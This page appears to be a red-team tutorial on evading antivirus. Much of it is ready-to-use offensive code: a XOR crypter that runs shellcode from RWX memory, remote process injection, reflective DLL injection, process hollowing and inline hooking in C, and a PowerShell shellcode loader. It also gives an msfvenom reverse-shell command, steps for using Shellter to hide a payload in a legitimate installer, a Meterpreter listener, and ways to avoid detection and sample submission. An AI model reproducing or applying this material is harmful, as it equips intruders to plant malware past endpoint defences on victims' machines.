---
layout: page
title: "The Minimum You Need to Know About Antivirus Evasion"
---

# The Minimum You Need to Know About Antivirus Evasion

Antivirus is not your biggest problem anymore. Most mature enterprise environments today run EDR: CrowdStrike, SentinelOne, Microsoft Defender for Endpoint. But understanding how AV works is still the prerequisite for everything that comes after. EDR detection logic is built on the same foundations. And you will encounter traditional AV in real engagements more often than you expect.

Start here.

## How AV Detects Threats

Modern AV engines combine four detection methods. No serious product relies on just one.

### Signature-Based Detection

The engine scans the filesystem for known malware signatures: a file hash, a specific byte sequence, or a set of string patterns that uniquely identify a known threat. Signature databases work similarly to YARA rules, performing pattern matching against binary content.

```c
typedef struct {
    uint8_t  *pattern;
    size_t    pattern_len;
    uint32_t  offset;       // offset within the file, or 0 for any
    char     *threat_name;
} av_signature_t;
```

The structural weakness is obvious: change a single bit and you produce a different hash. It is a blocklist, not intelligence. Effective only against known, unmodified malware.

### Heuristic-Based Detection

The engine disassembles the binary's instruction set, traces execution paths, and searches for patterns that resemble malicious behavior rather than exact byte matches. It decompiles, builds a call graph, and flags suspicious API call sequences.

A common heuristic flag: a PE that imports `VirtualAlloc`, `WriteProcessMemory`, and `CreateRemoteThread` together with no other significant imports. The combination implies shellcode injection. The engine does not need to know the payload, just the intent implied by the API surface.

### Behavioral Detection

The engine executes the binary inside an emulated sandbox and watches what it does at runtime. Opens a raw socket and then spawns `cmd.exe`? Flagged. Allocates a `PAGE_EXECUTE_READWRITE` memory region and writes into it? Flagged.

This is precisely why static obfuscation alone is not enough. The behavior exposes you even when the file looks clean on disk.

Modern sandboxes also look for sandbox evasion: checking the number of running processes, querying the screen resolution, sleeping before execution. If your sample detects it is inside a sandbox and behaves normally there, it has effectively evaded behavioral detection.

### Machine Learning Detection

Microsoft Defender runs two ML components: a client engine that builds local models and heuristics, and a cloud engine that analyzes metadata from every submitted sample. When the local model is uncertain, it queries the cloud for a final verdict.

This is why sample submission must be disabled before testing. Anything you send to VirusTotal goes directly to every vendor's detection pipeline and burns your tooling.

### AMSI: The Layer Most People Miss

Since Windows 10, Microsoft ships AMSI (Antimalware Scan Interface): a standardized interface that allows AV engines to scan content at runtime, before it executes. PowerShell, JScript, VBScript, and the .NET CLR all call into AMSI before executing any script content.

```c
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,       // script content in memory
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result       // AMSI_RESULT_DETECTED if malicious
);
```

AMSI does not scan files on disk. It scans the content of a script in memory at the moment it is about to execute. Obfuscated PowerShell that decodes at runtime gets scanned after decoding. Base64-encoded scripts are still caught because AMSI captures the decoded string before it runs.

Bypassing AMSI is a prerequisite for any PowerShell-based attack.

## On-Disk Evasion

When a payload lands on disk, three techniques are relevant, and each has a different ceiling.

### Packers

Packers compress and restructure a binary into a new executable with a different structure and a different hash. The packed binary contains the original payload encrypted or compressed, plus a small stub that decompresses and executes it at runtime.

```
Original PE:
  .text  -> code
  .data  -> data

Packed PE (UPX):
  UPX0  -> compressed original PE (empty section with high virtual size)
  UPX1  -> UPX decompression stub
  .rsrc -> resources
```

UPX alone gets you caught. AV engines recognize UPX section headers by default. Changing the section name magic bytes extends the shelf life slightly, but the heuristic engine still identifies the decompression pattern.

### Obfuscators

Obfuscators reorganize and mutate code without changing its behavior. They replace instructions with semantically equivalent ones, insert dead code that never executes, split functions into smaller ones, and reorder basic blocks.

```c
// Original
int calculate(int x) {
    return x * 2 + 1;
}

// Obfuscated (semantically equivalent)
int calculate(int x) {
    int dead = rand() % 0;   // dead code, never affects result
    int a    = x << 1;       // x * 2 via bit shift
    int b    = a | 1;        // +1 via bitwise OR (works when a is even)
    return b + dead;
}
```

Effective against signature-based detection, largely useless against behavioral. If the code does the same thing, the sandbox catches it.

### Crypters

Crypters are the most effective on-disk technique. The malicious code is encrypted at rest and a decryption stub runs in memory at execution time. The disk never holds the original payload in cleartext.

```c
#include <windows.h>
#include <stdlib.h>

unsigned char key[]               = { 0xDE, 0xAD, 0xBE, 0xEF };
unsigned char encrypted_payload[] = { /* encrypted bytes */ };
unsigned int  payload_len         = sizeof(encrypted_payload);

int main() {
    // Decrypt in-place
    for (unsigned int i = 0; i < payload_len; i++) {
        encrypted_payload[i] ^= key[i % sizeof(key)];
    }

    // Allocate RWX memory
    void *exec_mem = VirtualAlloc(
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Copy decrypted payload and execute
    memcpy(exec_mem, encrypted_payload, payload_len);
    ((void(*)())exec_mem)();

    return 0;
}
```

XOR is the simplest form. RC4 and AES are more robust. The key can be derived at runtime from the hostname, a timestamp, or an environment variable to prevent static decryption inside the AV sandbox.

On-disk evasion alone is not a viable strategy. The moment your payload executes, runtime behavior exposes you. Disk and memory techniques need to work together.

## In-Memory Evasion

The most effective approach avoids writing to disk entirely. Four techniques form the foundation.

### Remote Process Memory Injection

Inject shellcode into a legitimate running process. The shellcode runs inside something that looks clean to the OS. The sequence uses four Windows API calls:

```c
// 1. Get a handle to the target process (e.g., explorer.exe)
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    dwTargetPID
);

// 2. Allocate executable memory inside the target process
LPVOID pRemoteMem = VirtualAllocEx(
    hProcess,
    NULL,
    shellcode_len,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// 3. Write shellcode into the allocated region
SIZE_T bytesWritten;
WriteProcessMemory(
    hProcess,
    pRemoteMem,
    shellcode,
    shellcode_len,
    &bytesWritten
);

// 4. Execute shellcode in a remote thread
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)pRemoteMem,
    NULL,
    0,
    NULL
);
```

Your shellcode runs inside `explorer.exe` or `svchost.exe`. This is the base mechanism behind most C2 implant injection.

### Reflective DLL Injection

Standard DLL injection loads a DLL from disk via `LoadLibrary`. Reflective DLL injection loads a DLL from a buffer already in memory. Windows provides no API for this, so the DLL carries its own loader inside an exported function.

```c
// The reflective loader resolves the DLL's own base address,
// loads its imports by walking the PEB's module list,
// applies base relocations, and calls DllMain.

typedef ULONG_PTR (WINAPI *ReflectiveDllLoader_t)(void);

// Caller side: inject DLL bytes into target memory,
// locate the ReflectiveLoader export by walking the export directory,
// then call it as a remote thread start address.

ULONG_PTR loaderOffset = GetReflectiveLoaderOffset(dllBuffer);

LPVOID remoteBuffer = VirtualAllocEx(
    hProcess, NULL, dllLen,
    MEM_COMMIT, PAGE_EXECUTE_READWRITE
);

WriteProcessMemory(hProcess, remoteBuffer, dllBuffer, dllLen, NULL);

HANDLE hThread = CreateRemoteThread(
    hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteBuffer + loaderOffset),
    NULL, 0, NULL
);
```

The DLL never touches disk.

### Process Hollowing

Spawn a legitimate process in a suspended state, unmap its original image from memory, write your malicious executable in its place, update the entry point, and resume.

```c
// 1. Create the host process suspended
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(
    L"C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL, &si, &pi
);

// 2. Unmap the original image
// ZwUnmapViewOfSection is not exported by kernel32 — resolve from ntdll manually.
typedef NTSTATUS (NTAPI *ZwUnmapViewOfSection_t)(HANDLE, PVOID);
ZwUnmapViewOfSection_t ZwUnmapViewOfSection =
    (ZwUnmapViewOfSection_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "ZwUnmapViewOfSection"
    );

ZwUnmapViewOfSection(pi.hProcess, pRemoteImageBase);

// 3. Allocate memory at the malicious PE preferred base and write it
LPVOID pNewBase = VirtualAllocEx(
    pi.hProcess,
    (LPVOID)maliciousImageBase,
    maliciousSizeOfImage,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

WriteProcessMemory(pi.hProcess, pNewBase, maliciousBuffer, headerSize, NULL);
// ... write each PE section ...

// 4. Redirect entry point and resume
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);
ctx.Eax = (DWORD)((ULONG_PTR)pNewBase + maliciousEntryPointRVA);
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

From the OS perspective, `svchost.exe` is running. From your perspective, your payload is running inside it.

### Inline Hooking

Modify the first bytes of a target function in memory to redirect execution to your own code, then return to the original flow.

```c
void install_hook(void *target_func, void *hook_func) {
    DWORD oldProtect;

    // Make the target memory writable
    VirtualProtect(target_func, 14, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Write a 64-bit absolute JMP:
    // FF 25 00 00 00 00  ->  JMP [RIP+0]
    // followed by 8 bytes of absolute address
    uint8_t patch[] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };
    *(uint64_t *)(patch + 6) = (uint64_t)hook_func;
    memcpy(target_func, patch, sizeof(patch));

    VirtualProtect(target_func, 14, oldProtect, &oldProtect);
}
```

This is exactly how rootkits work, and precisely how EDRs work too. CrowdStrike and SentinelOne hook functions in `ntdll.dll` at startup: `NtCreateProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`. Every syscall passes through their hooks before reaching the kernel. When your implant patches those hooks out of memory, the EDR loses visibility into what you are doing. This technique is called unhooking, and it is the foundation of most modern C2 evasion.

## Testing Without Burning Your Tools

Never submit payloads to VirusTotal during an engagement. The moment you do, every vendor receives your sample, analyzes it, and builds signatures against it. Your tooling is burned, sometimes permanently.

Use [AntiScan.me](https://antiscan.me) instead. It scans against 30 AV engines and does not share samples with vendors. Four free scans per day.

Better than any scanning service: build a VM that mirrors the target environment exactly. Before testing, disable sample submission in Defender. Navigate to Windows Security, Virus and threat protection, Manage Settings, and turn off Automatic sample submission. Then test there, isolated from the internet.

When you do not know the target AV, AntiScan.me is your last resort. When you do know it, there is no substitute for testing against the real product.

## PowerShell In-Memory Injection

For environments where PowerShell is available, in-memory injection via P/Invoke is a practical starting point. The script compiles inline C# at runtime via `Add-Type`, importing `VirtualAlloc`, `CreateThread`, and `memset` directly from the Windows API.

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint   dwSize,
    uint   flAllocationType,
    uint   flProtect
);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint   dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint   dwCreationFlags,
    IntPtr lpThreadId
);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(
    IntPtr dest,
    uint   src,
    uint   count
);';

$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]] $var1 = <shellcode>;

$size = 0x1000;
if ($var1.Length -gt 0x1000) { $size = $var1.Length };

$x = $var2::VirtualAlloc(0, $size, 0x3000, 0x40);

for ($i = 0; $i -le ($var1.Length - 1); $i++) {
    $var2::memset([IntPtr]($x.ToInt32() + $i), $var1[$i], 1)
};

$var2::CreateThread(0, 0, $x, 0, 0, 0);
for (;;) { Start-sleep 60 };
```

`VirtualAlloc` with `flProtect = 0x40` allocates `PAGE_EXECUTE_READWRITE` memory. `memset` writes each shellcode byte into that region. `CreateThread` starts execution at its base address.

Generate the shellcode with msfvenom using the PowerShell output format:

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f powershell -v var1
```

The first iteration of this script, with descriptive variable names like `$winFunc` and `$sc`, gets flagged by roughly 28 of 59 engines. Renaming to generic names cuts detections significantly. AV string signatures target recognizable variable and function names, not the underlying logic.

Before running the script, check and set the execution policy:

```powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

GPO can enforce execution policies from Active Directory. If that is the case, per-script bypass via `-ExecutionPolicy Bypass` is an alternative.

## Shellter

Shellter is the most practical free tool for on-disk evasion. It injects shellcode into a legitimate PE binary using dynamic analysis: it traces the original execution flow and finds natural injection points that will not break the program's behavior. The result is a functional binary that also runs your payload.

```shell
sudo apt install shellter wine
sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32
shellter
```

Use stealth mode. It restores the original execution flow after injection. The user sees Spotify install. You get a shell.

For the listener, use a staged Meterpreter payload:

```shell
msfconsole -x "use exploit/multi/handler; \
               set payload windows/meterpreter/reverse_tcp; \
               set LHOST <ip>; \
               set LPORT 443; \
               run;"
```

Shellter still works against many targets, but detection rates have risen considerably. Pair it with a custom payload and an uncommon host binary. The default Msfvenom signatures are known. Avoid them.

## The Gap That Matters

Traditional AV scans files and, to some extent, runtime behavior inside a sandbox. EDR instruments the entire endpoint: kernel callbacks registered via `PsSetCreateProcessNotifyRoutine`, `PsSetCreateThreadNotifyRoutine`, and `PsSetLoadImageNotifyRoutine`; user-space hooks in `ntdll.dll` to capture every syscall transition; ETW (Event Tracing for Windows) providers feeding telemetry into a detection engine in real time.

The in-memory injection technique that bypassed legacy AV products years ago will not bypass a modern EDR today. The detection surface is fundamentally different.

Understanding AV is the foundation. It teaches you why certain techniques work and why they stop working. Everything in EDR evasion, from direct syscalls to sleep encryption to unhooking, is built on top of these same concepts. Get the foundation wrong and the advanced techniques make no sense.
